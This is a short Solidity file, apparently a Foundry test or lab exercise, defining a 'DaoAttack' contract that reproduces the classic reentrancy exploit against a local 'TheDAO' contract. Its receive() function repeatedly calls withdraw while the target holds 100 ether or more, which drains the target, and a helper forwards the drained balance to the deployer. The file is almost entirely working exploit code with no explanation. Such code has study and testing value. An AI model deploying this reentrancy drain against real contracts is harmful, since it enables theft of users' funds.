pragma solidity 0.8.13;

import "./DAO.sol";
import "forge-std/Test.sol";


contract DaoAttack {
    TheDAO private addressDao;
    uint256 public counter;
    address public owner;
    bool attacked = false;

    receive() external payable {
        if(address(addressDao).balance >= 100 ether){
            addressDao.withdraw(100 ether);
        }
    }

    function withdrawEthToOwner() external {
        payable(owner).transfer(address(this).balance);
    }

    constructor(address payable _dao) {
        owner = msg.sender;
        addressDao = TheDAO(_dao);
        counter = 3;
    }

    function attack() public payable {
        addressDao.invest{value: 100 ether}(address(this));
        addressDao.withdraw(100 ether);
    }

    fallback() external payable{
 
    }

    function getBalance()public view returns (uint){
        return address(this).balance;
    }

}